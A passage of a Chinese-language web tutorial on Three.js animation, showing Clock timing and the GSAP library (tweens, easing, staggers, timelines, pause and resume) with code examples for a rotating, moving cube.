class="line">render();</span><br></pre></td></tr></table></figure><p>注意：getDelta、getElapsedTime请勿同时用于同一帧，会导致getDelta计时不准。因为每次调用这2个函数，都会对oldTime属性进行重置，所以getDelta计算出来的就不是上一帧的时间。</p><h3 id="2-综合上述代码-4"><a href="#2-综合上述代码-4" class="headerlink" title="2 综合上述代码"></a>2 综合上述代码</h3><p>在前面创建的项目中的main.js文件写入代码，实现每5秒，即从原点出发匀速在x轴进行1m/s的匀速运动</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> THREE <span class="keyword">from</span> <span class="string">&quot;three&quot;</span>;</span><br><span class="line"><span class="comment">// 导入轨道控制器</span></span><br><span class="line"><span class="keyword">import</span> &#123; OrbitControls &#125; <span class="keyword">from</span> <span class="string">&quot;three/examples/jsm/controls/OrbitControls&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(THREE);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标：Clock该对象用于跟踪时间</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1、创建场景</span></span><br><span class="line"><span class="keyword">const</span> scene = <span class="keyword">new</span> THREE.Scene();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、创建相机</span></span><br><span class="line"><span class="keyword">const</span> camera = <span class="keyword">new</span> THREE.PerspectiveCamera(</span><br><span class="line">  <span class="number">75</span>,</span><br><span class="line">  <span class="built_in">window</span>.innerWidth / <span class="built_in">window</span>.innerHeight,</span><br><span class="line">  <span class="number">0.1</span>,</span><br><span class="line">  <span class="number">1000</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置相机位置</span></span><br><span class="line">camera.position.set(<span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">scene.add(camera);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加物体</span></span><br><span class="line"><span class="comment">// 创建几何体</span></span><br><span class="line"><span class="keyword">const</span> cubeGeometry = <span class="keyword">new</span> THREE.BoxGeometry(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">const</span> cubeMaterial = <span class="keyword">new</span> THREE.MeshBasicMaterial(&#123; <span class="attr">color</span>: <span class="number">0xffff00</span> &#125;);</span><br><span class="line"><span class="comment">// 根据几何体和材质创建物体</span></span><br><span class="line"><span class="keyword">const</span> cube = <span class="keyword">new</span> THREE.Mesh(cubeGeometry, cubeMaterial);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改物体的位置</span></span><br><span class="line"><span class="comment">// cube.position.set(5, 0, 0);</span></span><br><span class="line"><span class="comment">// cube.position.x = 3;</span></span><br><span class="line"><span class="comment">// 缩放</span></span><br><span class="line"><span class="comment">// cube.scale.set(3, 2, 1);</span></span><br><span class="line"><span class="comment">// cube.scale.x = 5;</span></span><br><span class="line"><span class="comment">// 旋转</span></span><br><span class="line">cube.rotation.set(<span class="built_in">Math</span>.PI / <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;XZY&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将几何体添加到场景中</span></span><br><span class="line">scene.add(cube);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(cube);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化渲染器</span></span><br><span class="line"><span class="keyword">const</span> renderer = <span class="keyword">new</span> THREE.WebGLRenderer();</span><br><span class="line"><span class="comment">// 设置渲染的尺寸大小</span></span><br><span class="line">renderer.setSize(<span class="built_in">window</span>.innerWidth, <span class="built_in">window</span>.innerHeight);</span><br><span class="line"><span class="comment">// console.log(renderer);</span></span><br><span class="line"><span class="comment">// 将webgl渲染的canvas内容添加到body</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(renderer.domElement);</span><br><span class="line"></span><br><span class="line"><span class="comment">// // 使用渲染器，通过相机将场景渲染进来</span></span><br><span class="line"><span class="comment">// renderer.render(scene, camera);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建轨道控制器</span></span><br><span class="line"><span class="keyword">const</span> controls = <span class="keyword">new</span> OrbitControls(camera, renderer.domElement);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加坐标轴辅助器</span></span><br><span class="line"><span class="keyword">const</span> axesHelper = <span class="keyword">new</span> THREE.AxesHelper(<span class="number">5</span>);</span><br><span class="line">scene.add(axesHelper);</span><br><span class="line"><span class="comment">// 设置时钟</span></span><br><span class="line"><span class="keyword">const</span> clock = <span class="keyword">new</span> THREE.Clock();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 获取时钟运行的总时长</span></span><br><span class="line">  <span class="keyword">let</span> time = clock.getElapsedTime();</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;时钟运行总时长：&quot;</span>, time);</span><br><span class="line">  <span class="comment">//   let deltaTime = clock.getDelta();</span></span><br><span class="line">  <span class="comment">//     console.log(&quot;两次获取时间的间隔时间：&quot;, deltaTime);</span></span><br><span class="line">  <span class="keyword">let</span> t = time % <span class="number">5</span>;</span><br><span class="line">  cube.position.x = t * <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  renderer.render(scene, camera);</span><br><span class="line">  <span class="comment">//   渲染下一帧的时候就会调用render函数</span></span><br><span class="line">  requestAnimationFrame(render);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">render();</span><br></pre></td></tr></table></figure><p>效果演示：</p><p><img src="https://i0.hdslb.com/bfs/article/30598fa39925444ccd5284764b35499960fd9699.gif@761w_543h_progressive.webp" alt="img"></p><h2 id="十、Gsap动画库使用"><a href="#十、Gsap动画库使用" class="headerlink" title="十、Gsap动画库使用"></a>十、Gsap动画库使用</h2><p>GSAP 是一个强大的 JavaScript 工具集，让大家秒变动画大佬。构建适用于所有主流浏览器的高性能动画。动画 CSS、SVG、画布、React、Vue、WebGL、颜色、字符串、运动路径、通用对象…… JavaScript 可以触摸的任何东西！GSAP 的ScrollTrigger插件让您可以用最少的代码创建令人瞠目结舌的滚动动画。</p><h3 id="1-安装GSAP模块"><a href="#1-安装GSAP模块" class="headerlink" title="1 安装GSAP模块"></a>1 安装GSAP模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install gsap</span><br></pre></td></tr></table></figure><h3 id="2-创建动画"><a href="#2-创建动画" class="headerlink" title="2 创建动画"></a>2 创建动画</h3><p>例如，如果html元素创建动画，将 ‘.box’ 类的元素设置1秒时间水平移动 200px 的动画。可以这么编写</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入动画库</span></span><br><span class="line"><span class="keyword">import</span> gsap <span class="keyword">from</span> <span class="string">&quot;gsap&quot;</span>;</span><br><span class="line">gsap.to(<span class="string">&quot;.box&quot;</span>, &#123; <span class="attr">x</span>: <span class="number">200</span> &#125;)</span><br></pre></td></tr></table></figure><p><img src="https://i0.hdslb.com/bfs/article/bf128cad580f9386046607041ddd42a2ef7ad705.gif@638w_303h_progressive.webp" alt="img"></p><p>在three.js中如果我们想要将物体，例如立方体移动设置1秒时间水平移动 200px 的动画。可以这么编写</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入动画库</span></span><br><span class="line"><span class="keyword">import</span> gsap <span class="keyword">from</span> <span class="string">&quot;gsap&quot;</span>;</span><br><span class="line">gsap.to(cube.position, &#123; <span class="attr">x</span>: <span class="number">200</span> &#125;)</span><br></pre></td></tr></table></figure><p><code>gsap.to() -</code> 这是最常见的补间类型。是设置当前元素或者变量的状态，到设置的状态的补间动画。所谓的补间动画，就是2个关键帧（即2种物体的状态）有了，框架自带计算出中间某个时刻的状态，从而填补2个状态间，动画的空白时刻，从而实现完整动画。</p><p><code>gsap.to</code>有2个参数，第一个是目标元素或者变量。如果传入的是.box之类的css字符串选择器，GSAP 在后台使用document.querySelectorAll()选中页面的匹配的元素。当第一个目标是对象时，GSAP就会对其属性值进行修改来实现补间动画。</p><h3 id="3-GSAP设置动画的属性"><a href="#3-GSAP设置动画的属性" class="headerlink" title="3 GSAP设置动画的属性"></a>3 GSAP设置动画的属性</h3><p>如何是html元素，可以设置的属性有</p><p><img src="https://i0.hdslb.com/bfs/article/6fe9a5204d47e41dbbde6b7407d97aec71b276ef.png@242w_758h_progressive.webp" alt="img"></p><p>对应CSS样式属性</p><p><img src="https://i0.hdslb.com/bfs/article/729c19134fa8c4499934502561074c9164a8cf4b.png@647w_657h_progressive.webp" alt="img"></p><p>下面演示向右水平移动+旋转.box元素的效果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gsap.to(<span class="string">&quot;.box&quot;</span>, &#123;</span><br><span class="line">  duration: <span class="number">2</span>,</span><br><span class="line">  x: <span class="number">200</span>,</span><br><span class="line">  rotation: <span class="number">360</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://i0.hdslb.com/bfs/article/b1aa9500c48d8dcb9cfcb706663ac9b4f6aa4435.gif@638w_303h_progressive.webp" alt="img"></p><p>默认情况下，GSAP 将使用 px 和度数进行变换，但您可以使用其他单位，例如 vw、弧度，甚至可以进行自己的 JS 计算或相对值！</p><p>例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x : <span class="number">200</span> , <span class="comment">// 使用 px 的默认值</span></span><br><span class="line">x : <span class="string">&quot;+=200&quot;</span> <span class="comment">// 相对值</span></span><br><span class="line">x : <span class="string">&#x27;40vw&#x27;</span> , <span class="comment">// 或者传入一个具有不同单位的字符串以供 GSAP 解析</span></span><br><span class="line">x : <span class="function">() =&gt;</span> <span class="built_in">window</span> 。innerWidth / <span class="number">2</span> , <span class="comment">// 你甚至可以使用函数值进行计算！</span></span><br><span class="line">rotation：<span class="number">360</span> <span class="comment">// 使用默认的度数</span></span><br><span class="line">rotation：“<span class="number">1.</span>25rad” <span class="comment">// 使用弧度</span></span><br></pre></td></tr></table></figure><p>如果第一个参数目标不是html元素，也可以是对象。。您可以针对任何对象的任何属性，甚至是您创建的任意属性，如下所示</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123; <span class="attr">myNum</span>: <span class="number">10</span>, <span class="attr">myColor</span>: <span class="string">&quot;red&quot;</span> &#125;;</span><br><span class="line">gsap.to(obj, &#123;</span><br><span class="line">  myNum: <span class="number">200</span>,</span><br><span class="line">  myColor: <span class="string">&quot;blue&quot;</span>,</span><br><span class="line">  onUpdate: <span class="function">() =&gt;</span> <span class="built_in">console</span>.log(obj.myNum, obj.myColor)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这里可以让obj.myNum值从10变化到200，也可以让颜色myColor的值从红色变化到蓝色。每一次更新值的时候，执行onUpdate所设置的回调函数。</p><h3 id="4-GSAP特殊属性控制动画"><a href="#4-GSAP特殊属性控制动画" class="headerlink" title="4 GSAP特殊属性控制动画"></a>4 GSAP特殊属性控制动画</h3><p><code>duration</code>：动画持续时间（秒） 默认值：0.5</p><p><code>delay</code>：动画开始前的延迟量（秒）</p><p><code>repeat</code>：动画应该重复多少次。-1为一直重复</p><p><code>yoyo</code>：如果为 true，则每隔一个重复，补间将沿相反方向运行。（像悠悠球一样）默认值：false</p><p><code>ease</code>：控制动画期间的变化率。</p><p><code>onComplete</code>：动画完成时调用的函数</p><p><code>onUpdate</code>：动画值更新时调用的函数</p><p><strong>ease动画属性设置</strong><br>缓动可能是动作设计中最重要的部分。精心挑选的轻松将为您的动画增添个性并注入活力。</p><p>在下面的演示中看看 no ease 和bounce ease 之间的区别！绿色盒子以匀速的速度旋转，而紫色盒子带有“反弹”旋转动画，感觉就不一样。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gsap.to(<span class="string">&quot;.green&quot;</span>, &#123; <span class="attr">rotation</span>: <span class="number">360</span>, <span class="attr">duration</span>: <span class="number">2</span>, <span class="attr">ease</span>: <span class="string">&quot;none&quot;</span> &#125;);</span><br><span class="line"></span><br><span class="line">gsap.to(<span class="string">&quot;.purple&quot;</span>, &#123; <span class="attr">rotation</span>: <span class="number">360</span>, <span class="attr">duration</span>: <span class="number">2</span>, <span class="attr">ease</span>: <span class="string">&quot;bounce.out&quot;</span> &#125;);</span><br></pre></td></tr></table></figure><p><img src="https://i0.hdslb.com/bfs/article/feb4ece2328520705c6108b135f560fdc80fcee0.gif@942w_246h_progressive.webp" alt="img"></p><p>在引擎内部，“ease”是一种数学计算，用于控制补间期间的变化率。但不用担心，框架会为您做所有的数学计算！您只需坐下来选择最适合我们的动画的效果即可。</p><p>对于大多数效果，分为三种类型in、out、inOut。这些控制了轻松过程中的动量。</p><p>像这样的 设置ease：”power1.out” 是 UI 过渡的最佳选择；它们启动速度很快，这有助于 UI 感觉反应灵敏，然后它们在接近尾声时放松，给人一种自然的摩擦感。</p><p>理解ease的最好方法是玩转ease配置的可视化工具！</p><p>地址：<a href="https://greensock.com/get-started/#greenSockEaseVisualizer">https://greensock.com/get-started/#greenSockEaseVisualizer</a></p><p>效果：</p><p><img src="https://i0.hdslb.com/bfs/article/571505cca304e007f8f140f8ac404c23f4cfbfc5.gif@942w_872h_progressive.webp" alt="img"></p><p><strong>Staggers交错</strong><br>这是我们最喜欢的技巧之一！如果补间有多个目标，您可以轻松地在每个动画的开始之间添加一些交错效果：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">gsap.from(<span class="string">&quot;.box&quot;</span>, &#123;</span><br><span class="line">  duration: <span class="number">2</span>,</span><br><span class="line">  scale: <span class="number">0.5</span>,</span><br><span class="line">  opacity: <span class="number">0</span>,</span><br><span class="line">  delay: <span class="number">0.5</span>,</span><br><span class="line">  stagger: <span class="number">0.2</span>,</span><br><span class="line">  ease: <span class="string">&quot;elastic&quot;</span>,</span><br><span class="line">  force3D: <span class="literal">true</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.querySelectorAll(<span class="string">&quot;.box&quot;</span>).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">box</span>) </span>&#123;</span><br><span class="line">  box.addEventListener(<span class="string">&quot;click&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    gsap.to(<span class="string">&quot;.box&quot;</span>, &#123;</span><br><span class="line">      duration: <span class="number">0.5</span>,</span><br><span class="line">      opacity: <span class="number">0</span>,</span><br><span class="line">      y: -<span class="number">100</span>,</span><br><span class="line">      stagger: <span class="number">0.1</span>,</span><br><span class="line">      ease: <span class="string">&quot;back.in&quot;</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://i0.hdslb.com/bfs/article/06690133d728fa622024e5958e8b7408d1919715.gif@942w_171h_progressive.webp" alt="img"></p><p>这里<code>stagger</code>设置0.2，即为将.box选中多个元素设置为每隔0.2秒开始运动1个元素实现效果。</p><p><strong>时间线-Timelines</strong><br>时间线是创建易于调整、有弹性的动画序列的关键。当您将补间添加到时间线时，默认情况下，它们会按照添加的顺序一个接一个地播放。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建时间线动画</span></span><br><span class="line"><span class="keyword">let</span> tl = gsap.timeline()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 现在用tl代替以前的gsap来设置动画即可。</span></span><br><span class="line">tl.to(<span class="string">&quot;.green&quot;</span>, &#123; <span class="attr">x</span>: <span class="number">600</span>, <span class="attr">duration</span>: <span class="number">2</span> &#125;);</span><br><span class="line">tl.to(<span class="string">&quot;.purple&quot;</span>, &#123; <span class="attr">x</span>: <span class="number">600</span>, <span class="attr">duration</span>: <span class="number">1</span> &#125;);</span><br><span class="line">tl.to(<span class="string">&quot;.orange&quot;</span>, &#123; <span class="attr">x</span>: <span class="number">600</span>, <span class="attr">duration</span>: <span class="number">1</span> &#125;);</span><br></pre></td></tr></table></figure><p><img src="https://i0.hdslb.com/bfs/article/1bab035b89eb2ef011aed574f7937065fba17e14.gif@942w_447h_progressive.webp" alt="img"></p><h3 id="5-Threejs场景种应用"><a href="#5-Threejs场景种应用" class="headerlink" title="5 Threejs场景种应用"></a>5 Threejs场景种应用</h3><p>设置立方体旋转</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gsap.to(</span><br><span class="line">  cube.rotation,</span><br><span class="line">  &#123;</span><br><span class="line">    x: <span class="number">2</span> * <span class="built_in">Math</span>.PI,</span><br><span class="line">    duration: <span class="number">5</span>,</span><br><span class="line">    ease: <span class="string">&quot;power1.inOut&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>设置立方体来回往返运动</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置动画</span></span><br><span class="line"><span class="keyword">var</span> animate1 = gsap.to(cube.position, &#123;</span><br><span class="line">  x: <span class="number">5</span>,</span><br><span class="line">  duration: <span class="number">5</span>,</span><br><span class="line">  ease: <span class="string">&quot;power1.inOut&quot;</span>,</span><br><span class="line">  <span class="comment">//   设置重复的次数，无限次循环-1</span></span><br><span class="line">  repeat: -<span class="number">1</span>,</span><br><span class="line">  <span class="comment">//   往返运动</span></span><br><span class="line">  yoyo: <span class="literal">true</span>,</span><br><span class="line">  <span class="comment">//   delay，延迟2秒运动</span></span><br><span class="line">  delay: <span class="number">2</span>,</span><br><span class="line">  <span class="comment">// 当动画完成时，执行回调函数</span></span><br><span class="line">  onComplete: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;动画完成&quot;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">//当动画开始时，执行回调函数</span></span><br><span class="line">  onStart: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;动画开始&quot;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>让双击画面，控制立方体动画暂停和恢复动画，前面创建的animate1这个动画实例，有isActive方法，可以用来获取当前动画是暂停还是播放状态，播放状态时isActive方法返回为true，暂停时为false，根据这个状态来调用pause方法来暂停动画和恢复动画。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&quot;dblclick&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">//   console.log(animate1);</span></span><br><span class="line">  <span class="keyword">if</span> (animate1.isActive()) &#123;</span><br><span class="line">    <span class="comment">//   暂停</span></span><br><span class="line">    animate1.pause();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//   恢复</span></span><br><span class="line">    animate1.resume();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="6-综合上述代码"><a href="#6-综合上述代码" class="headerlink" title="6 综合上述代码"></a>6 综合上述代码</h3><p><strong>在前面创建的项目中的main.js文件写入代码</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> THREE <span class="keyword">from</span> <span class="string">&quot;three&quot;</span>;</span><br><span class="line"><span class="comment">// 导入轨道控制器</span></span><br><span class="line"><span class="keyword">import</span> &#123; OrbitControls &#125; <span class="keyword">from</span> <span class="string">&quot;three/examples/jsm/controls/OrbitControls&quot;</span>;</span><br><span class="line"><span class="comment">// 导入动画库</span></span><br><span class="line"><span class="keyword">import</span> gsap <span class="keyword">from</span> <span class="string">&quot;gsap&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(THREE);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标：掌握gsap设置各种动画效果</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1、创建场景</span></span><br><span class="line"><span class="keyword">const</span> scene = <span class="keyword">new</span> THREE.Scene();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、创建相机</span></span><br><span class="line"><span class="keyword">const</span> camera = <span class="keyword">new</span> THREE.PerspectiveCamera(</span><br><span class="line">  <span class="number">75</span>,</span><br><span class="line">  <span class="built_in">window</span>.innerWidth / <span class="built_in">window</span>.innerHeight,</span><br><span class="line">  <span class="number">0.1</span>,</span><br><span class="line">  <span class="number">1000</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置相机位置</span></span><br><span class="line">camera.position.set(<span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">scene.add(camera);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加物体</span></span><br><span class="line"><span class="comment">// 创建几何体</span></span><br><span class="line"><span class="keyword">const</span> cubeGeometry = <span class="keyword">new</span> THREE.BoxGeometry(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">const</span> cubeMaterial = <span class="keyword">new</span> THREE.MeshBasicMaterial(&#123; <span class="attr">color</span>: <span class="number">0xffff00</span> &#125;);</span><br><span class="line"><span class="comment">// 根据几何体和材质创建物体</span></span><br><span class="line"><span class="keyword">const</span> cube = <span class="keyword">new</span> THREE.Mesh(cubeGeometry, cubeMaterial);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改物体的位置</span></span><br><span class="line"><span class="comment">// cube.position.set(5, 0, 0);</span></span><br><span class="line"><span class="comment">// cube.position.x = 3;</span></span><br><span class="line"><span class="comment">// 缩放</span></span><br><span class="line"><span class="comment">// cube.scale.set(3, 2, 1);</span></span><br><span class="line"><span class="comment">// cube.scale.x = 5;</span></span><br><span class="line"><span class="comment">// 旋转</span></span><br><span class="line">cube.rotation.set(<span class="built_in">Math</span>.PI / <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;XZY&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将几何体添加到场景中</span></span><br><span class="line">scene.add(cube);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(cube);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化渲染器</span></span><br><span class="line"><span class="keyword">const</span> renderer = <span class="keyword">new</span> THREE.WebGLRenderer();</span><br><span class="line"><span class="comment">// 设置渲染的尺寸大小</span></span><br><span class="line">renderer.setSize(<span class="built_in">window</span>.innerWidth, <span class="built_in">window</span>.innerHeight);</span><br><span class="line"><span class="comment">// console.log(renderer);</span></span><br><span class="line"><span class="comment">// 将webgl渲染的canvas内容添加到body</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(renderer.domElement);</span><br><span class="line"></span><br><span class="line"><span class="comment">// // 使用渲染器，通过相机将场景渲染进来</span></span><br><span class="line"><span class="comment">// renderer.render(scene, camera);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建轨道控制器</span></span><br><span class="line"><span class="keyword">const</span> controls = <span class="keyword">new</span> OrbitControls(camera, renderer.domElement);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加坐标轴辅助器</span></span><br><span class="line"><span class="keyword">const</span> axesHelper = <span class="keyword">new</span> THREE.AxesHelper(<span 